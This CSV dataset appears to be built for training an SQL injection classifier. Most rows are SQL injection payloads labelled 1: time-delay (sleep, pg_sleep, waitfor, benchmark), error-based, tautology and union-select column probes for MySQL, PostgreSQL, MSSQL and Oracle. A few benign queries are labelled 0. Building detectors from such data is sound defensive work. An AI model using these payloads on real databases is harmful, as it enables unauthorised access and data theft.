Sentence,Label
(  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  --,1
(  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  -- mmjk,1
"(  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and ""%""  =  """,1
"(  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and ""plqe""  =  ""plqe",1
"(  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and ""wsmz"" like ""wsmz",1
(  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and '%'  =  ',1
(  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'mcrt'  =  'mcrt,1
(  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'fdgq'  =  'fdgq,1
(  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'yfvu' like 'yfvu,1
"(  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  ""%""  =  """,1
"(  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  ""avyw""  =  ""avyw",1
"(  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  ""vjlr"" like ""vjlr",1
(  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  '%'  =  ',1
(  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  'pags'  =  'pags,1
(  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  'pgth'  =  'pgth,1
(  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  'kerg' like 'kerg,1
"(  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (   ""%""  =  """,1
"(  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (   ""hxdd""  =  ""hxdd",1
"(  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (   ""xeki"" like ""xeki",1
(  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (   '%'  =  ',1
(  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (   'stea'  =  'stea,1
(  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (   'cbaj'  =  'cbaj,1
(  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (   'nbzf' like 'nbzf,1
"(  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (     (  ""%""  =  """,1
"(  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (     (  ""sxih""  =  ""sxih",1
"(  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (     (  ""eakt"" like ""eakt",1
(  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (     (  '%'  =  ',1
(  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (     (  'ksoc'  =  'ksoc,1
(  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (     (  'jirc'  =  'jirc,1
(  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (     (  'pfle' like 'pfle,1
(  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (     (  3124  =  3124,1
(  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (   4982  =  4982,1
(  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  9069  =  9069,1
"(  select 2768 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  2768  =  2768,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )",1
(  select 2527 from pg_sleep  (  5   )    ),1
"(  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6130  =  6130,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )",1
(  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1931  =  1931  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    ),1
(  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  5877  =  5877  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    ),1
( SELECT column_name  FROM table_name  WHERE condition  ) ;,0
"(  select concat  (  0x7171706a71,  (  select   (  elt  (  7381  =  7381,1   )    )     )  ,0x717a767a71   )    )",1
( SELECT ProductID   FROM OrderDetails   WHERE Quantity  =  10 ) ;,0
( SELECT ProductID   FROM OrderDetails   WHERE Quantity > 99 ) ;,0
( SELECT ProductID   FROM OrderDetails   WHERE Quantity > 1000 ) ;,0
"(  updatexml  (  8862,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  8862  =  8862,1   )    )     )  ,0x717a767a71  )  ,8981   )    )",1
)    )   ;waitfor delay '0:0:__TIME__'--,1
")    )    or benchmark  (  10000000,MD5  (  1   )    )   #",1
)    )    or pg_sleep  (  __TIME__  )  --,1
)  ;waitfor delay '0:0:__TIME__'--,1
")   or benchmark  (  10000000,MD5  (  1   )    )   #",1
)   or true--,1
)   union select * from information_schema.tables;,1
*ayustar,0
*paci3nte,0
-- &password  =,1
--SELECT * FROM Customers;,0
-8463   )    )     )   or 4861  =  9834#,1
-9054   )    )     )   or 9323  =  9323#,1
-2781   )    )     )   or 2573  =  5848--,1
-5134   )    )     )   or 8571  =  8571--,1
"-9295   )    )     )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  8752  =  8752",1
"-6170   )    )     )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1
-7874   )    )     )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  2817  =  2817,1
-7277   )    )     )   order by 1#,1
-8045   )    )     )   order by 1--,1
-5854   )    )     )   union all select 5645#,1
"-3349   )    )     )   union all select 6553,6553#",1
"-5150   )    )     )   union all select 5660,5660,5660#",1
"-5052   )    )     )   union all select 8351,8351,8351,8351#",1
"-4770   )    )     )   union all select 6356,6356,6356,6356,6356#",1
"-1339   )    )     )   union all select 2938,2938,2938,2938,2938,2938#",1
"-1598   )    )     )   union all select 9418,9418,9418,9418,9418,9418,9418#",1
"-5198   )    )     )   union all select 7089,7089,7089,7089,7089,7089,7089,7089#",1
"-1339   )    )     )   union all select 6318,6318,6318,6318,6318,6318,6318,6318,6318#",1
"-6595   )    )     )   union all select 2688,2688,2688,2688,2688,2688,2688,2688,2688,2688#",1
"-6440   )    )     )   union all select 3316,3316,3316,3316,3316,3316,3316,3316,3316,3316--",1
"-5957   )    )     )   union all select 8485,8485,8485,8485,8485,8485,8485,8485,8485--",1
"-7678   )    )     )   union all select 2622,2622,2622,2622,2622,2622,2622,2622--",1
"-9659   )    )     )   union all select 8665,8665,8665,8665,8665,8665,8665--",1
"-7101   )    )     )   union all select 4587,4587,4587,4587,4587,4587--",1
"-4772   )    )     )   union all select 3879,3879,3879,3879,3879--",1
"-8073   )    )     )   union all select 4481,4481,4481,4481--",1
"-8794   )    )     )   union all select 5802,5802,5802--",1
"-4305   )    )     )   union all select 2401,2401--",1
-3881   )    )     )   union all select 4438--,1
-8056   )    )    as botl where 9225  =  9225 or   (  1182  =  7641  )  *7641--,1
-6178   )    )    as lygb where 9559  =  9559 or   (  8459  =  8459  )  *4906--,1
-2745   )    )    as aywp where 9735  =  9735 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,1
-4582   )    )    as gvfo where 8885  =  8885 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,1
"-1157   )    )    as sxie where 7118  =  7118 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1
-5694   )    )    as cxnb where 6858  =  6858 or 9323  =  9323#,1
-6217   )    )    as hyws where 3441  =  3441 or 9421  =  4695#,1
-1648   )    )    as oqqy where 3459  =  3459 or 6872  =  6872--,1
-2351   )    )    as xdqn where 4019  =  4019 or 8571  =  8571--,1
-5962   )    )    as jbqv where 2583  =  2583 or 7496  =  8560--,1
-8163   )    )    as cvai where 2360  =  2360 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,1
"-9840   )    )    as thod where 4790  =  4790 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1
-8828   )    )    as ospo where 2141  =  2141 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,1
"-1168   )    )    as vlol where 3475  =  3475 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1
-6792   )    )    as zlho where 4758  =  4758 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,1
"-9432   )    )    as nqya where 8387  =  8387 or elt  (  9242  =  6180,6180  )  --",1
"-8924   )    )    as jybr where 7901  =  7901 or elt  (  1032  =  1032,3623  )  --",1
"-7971   )    )    as armw where 9474  =  9474 or make_set  (  9354  =  9354,7185  )  --",1
"-9487   )    )    as rvck where 9404  =  9404 or make_set  (  8921  =  6045,6045  )  --",1
-5555   )    )    as ldte where 4583  =  4583 order by 1#,1
-4137   )    )    as elxu where 5672  =  5672 order by 1--,1
-9446   )    )    as wmrq where 3705  =  3705 union all select 3705#,1
"-1687   )    )    as lnva where 8396  =  8396 union all select 8396,8396#",1
"-4091   )    )    as lqqy where 3030  =  3030 union all select 3030,3030,3030#",1
"-9514   )    )    as xdkw where 4975  =  4975 union all select 4975,4975,4975,4975#",1
"-4182   )    )    as wkfh where 6145  =  6145 union all select 6145,6145,6145,6145,6145#",1
"-2397   )    )    as oizy where 1746  =  1746 union all select 1746,1746,1746,1746,1746,1746#",1
"-3071   )    )    as uiiu where 8910  =  8910 union all select 8910,8910,8910,8910,8910,8910,8910#",1
"-3116   )    )    as jyiq where 3875  =  3875 union all select 3875,3875,3875,3875,3875,3875,3875,3875#",1
"-6412   )    )    as cnfs where 6557  =  6557 union all select 6557,6557,6557,6557,6557,6557,6557,6557,6557#",1
"-9924   )    )    as zgqa where 2867  =  2867 union all select 2867,2867,2867,2867,2867,2867,2867,2867,2867,2867#",1
"-8069   )    )    as sxbn where 7689  =  7689 union all select 7689,7689,7689,7689,7689,7689,7689,7689,7689,7689--",1
"-8203   )    )    as eqlf where 6132  =  6132 union all select 6132,6132,6132,6132,6132,6132,6132,6132,6132--",1
"-2889   )    )    as iqzv where 1786  =  1786 union all select 1786,1786,1786,1786,1786,1786,1786,1786--",1
"-7511   )    )    as xqzf where 9939  =  9939 union all select 9939,9939,9939,9939,9939,9939,9939--",1
"-8325   )    )    as ajxq where 6630  =  6630 union all select 6630,6630,6630,6630,6630,6630--",1
"-3862   )    )    as vqtl where 9629  =  9629 union all select 9629,9629,9629,9629,9629--",1
"-6514   )    )    as pbgg where 6841  =  6841 union all select 6841,6841,6841,6841--",1
"-3462   )    )    as biyl where 5143  =  5143 union all select 5143,5143,5143--",1
"-2216   )    )    as hxmq where 5677  =  5677 union all select 5677,5677--",1
-8945   )    )    as fszo where 2320  =  2320 union all select 2320--,1
-5350   )    )    or 9323  =  9323#,1
-2291   )    )    or 4067  =  5666#,1
-1354   )    )    or 8571  =  8571--,1
-6202   )    )    or 7845  =  1962--,1
"-1772   )    )    or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   8904  =  8904",1
"-5606   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1
-7720   )    )    or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   8254  =  8254,1
-2573   )    )    order by 1#,1
-8404   )    )    order by 1--,1
-7231   )    )    union all select 7639#,1
"-2365   )    )    union all select 8190,8190#",1
"-2140   )    )    union all select 8174,8174,8174#",1
"-3361   )    )    union all select 2827,2827,2827,2827#",1
"-1368   )    )    union all select 1310,1310,1310,1310,1310#",1
"-8490   )    )    union all select 6910,6910,6910,6910,6910,6910#",1
"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",1
"-5139   )    )    union all select 3373,3373,3373,3373,3373,3373,3373,3373#",1
"-9032   )    )    union all select 8377,8377,8377,8377,8377,8377,8377,8377,8377#",1
"-5082   )    )    union all select 4013,4013,4013,4013,4013,4013,4013,4013,4013,4013#",1
"-1620   )    )    union all select 6257,6257,6257,6257,6257,6257,6257,6257,6257,6257--",1
"-2048   )    )    union all select 7054,7054,7054,7054,7054,7054,7054,7054,7054--",1
"-1065   )    )    union all select 7437,7437,7437,7437,7437,7437,7437,7437--",1
"-6368   )    )    union all select 4646,4646,4646,4646,4646,4646,4646--",1
"-1408   )    )    union all select 5715,5715,5715,5715,5715,5715--",1
"-3126   )    )    union all select 6718,6718,6718,6718,6718--",1
"-9532   )    )    union all select 6039,6039,6039,6039--",1
"-6400   )    )    union all select 4650,4650,4650--",1
"-1868   )    )    union all select 1859,1859--",1
-1188   )    )    union all select 4711--,1
-6129  )   as vuze where 1565  =  1565 or   (  8459  =  8459  )  *4906--,1
-9522  )   as lraw where 9472  =  9472 or   (  4087  =  8213  )  *8213--,1
-7561  )   as ilrm where 8828  =  8828 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,1
-1344  )   as gqgi where 2545  =  2545 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,1
"-7184  )   as fshx where 3408  =  3408 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1
-5852  )   as anca where 3574  =  3574 or 3958  =  5536#,1
-7859  )   as ipdg where 4413  =  4413 or 9323  =  9323#,1
-6802  )   as coyv where 5693  =  5693 or 8571  =  8571--,1
-1499  )   as gxfm where 9762  =  9762 or 5989  =  4782--,1
-9581  )   as jkqo where 5200  =  5200 or 6872  =  6872--,1
-2348  )   as sige where 1639  =  1639 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,1
"-5064  )   as mzxc where 1889  =  1889 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1
-1300  )   as rrsm where 1086  =  1086 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,1
"-1332  )   as qtbb where 7261  =  7261 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1
-5751  )   as jybu where 4739  =  4739 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,1
"-4699  )   as mymz where 3405  =  3405 or elt  (  1032  =  1032,3623  )  --",1
"-9698  )   as pvhn where 3223  =  3223 or elt  (  6563  =  9210,9210  )  --",1
"-5825  )   as mflf where 3999  =  3999 or make_set  (  1492  =  7153,7153  )  --",1
"-3953  )   as wjjk where 6433  =  6433 or make_set  (  9354  =  9354,7185  )  --",1
-9072  )   as saot where 2278  =  2278 order by 1#,1
-8523  )   as hzqs where 8944  =  8944 order by 1--,1
-4331  )   as inpx where 9804  =  9804 union all select 9804#,1
"-5518  )   as yvqm where 7360  =  7360 union all select 7360,7360#",1
"-9541  )   as bnky where 3934  =  3934 union all select 3934,3934,3934#",1
"-1244  )   as qszw where 2332  =  2332 union all select 2332,2332,2332,2332#",1
"-8933  )   as iiyr where 1974  =  1974 union all select 1974,1974,1974,1974,1974#",1
"-6778  )   as xutm where 6442  =  6442 union all select 6442,6442,6442,6442,6442,6442#",1
"-4305  )   as ldrt where 2567  =  2567 union all select 2567,2567,2567,2567,2567,2567,2567#",1
"-9615  )   as dntk where 4780  =  4780 union all select 4780,4780,4780,4780,4780,4780,4780,4780#",1
"-9007  )   as gill where 6462  =  6462 union all select 6462,6462,6462,6462,6462,6462,6462,6462,6462#",1
"-9445  )   as dmur where 4371  =  4371 union all select 4371,4371,4371,4371,4371,4371,4371,4371,4371,4371#",1
"-8042  )   as zhoq where 2120  =  2120 union all select 2120,2120,2120,2120,2120,2120,2120,2120,2120,2120--",1
"-5524  )   as eoyk where 6928  =  6928 union all select 6928,6928,6928,6928,6928,6928,6928,6928,6928--",1
"-7611  )   as tuje where 6101  =  6101 union all select 6101,6101,6101,6101,6101,6101,6101,6101--",1
"-9122  )   as sdlg where 1546  =  1546 union all select 1546,1546,1546,1546,1546,1546,1546--",1
"-9795  )   as wrgs where 5427  =  5427 union all select 5427,5427,5427,5427,5427,5427--",1
"-6405  )   as ilah where 5145  =  5145 union all select 5145,5145,5145,5145,5145--",1
"-9821  )   as qqrm where 7152  =  7152 union all select 7152,7152,7152,7152--",1
"-5859  )   as ernq where 8394  =  8394 union all select 8394,8394,8394--",1
"-1949  )   as smyn where 4066  =  4066 union all select 4066,4066--",1
-4965  )   as imga where 3705  =  3705 union all select 3705--,1
-4669  )   or 2452  =  1601#,1
-6755  )   or 9323  =  9323#,1
-4901  )   or 3407  =  6442#,1
-3849  )   or 5580  =  3442--,1
-7562  )   or 8571  =  8571--,1
-9100  )   or 8792  =  9550--,1
"-5830  )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )",1
"-1707  )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  7756  =  7756",1
"-1139  )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1
"-8209  )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1
-7535  )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     ),1
-2374  )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  2576  =  2576,1
-8753  )   order by 1#,1
-4191  )   order by 1#,1
-6616  )   order by 1--,1
-7901  )   order by 1--,1
-7345  )   union all select 3866#,1
-3598  )   union all select 2264#,1
"-8349  )   union all select 8126,8126#",1
"-5218  )   union all select 9677,9677#",1
"-9509  )   union all select 1193,1193,1193#",1
"-8124  )   union all select 7251,7251,7251#",1
"-3518  )   union all select 1877,1877,1877,1877#",1
"-2325  )   union all select 4692,4692,4692,4692#",1
"-5362  )   union all select 7297,7297,7297,7297,7297#",1
"-9337  )   union all select 5648,5648,5648,5648,5648#",1
"-4919  )   union all select 2608,2608,2608,2608,2608,2608#",1
"-8893  )   union all select 7594,7594,7594,7594,7594,7594#",1
"-9171  )   union all select 6880,6880,6880,6880,6880,6880,6880#",1
"-9508  )   union all select 9950,9950,9950,9950,9950,9950,9950#",1
"-5849  )   union all select 6168,6168,6168,6168,6168,6168,6168,6168#",1
"-3130  )   union all select 1741,1741,1741,1741,1741,1741,1741,1741#",1
"-5606  )   union all select 7118,7118,7118,7118,7118,7118,7118,7118,7118#",1
"-4236  )   union all select 5260,5260,5260,5260,5260,5260,5260,5260,5260#",1
"-2417  )   union all select 2169,2169,2169,2169,2169,2169,2169,2169,2169,2169#",1
"-1999  )   union all select 1779,1779,1779,1779,1779,1779,1779,1779,1779,1779#",1
"-8432  )   union all select 8169,8169,8169,8169,8169,8169,8169,8169,8169,8169--",1
"-3379  )   union all select 4985,4985,4985,4985,4985,4985,4985,4985,4985,4985--",1
"-2168  )   union all select 4980,4980,4980,4980,4980,4980,4980,4980,4980--",1
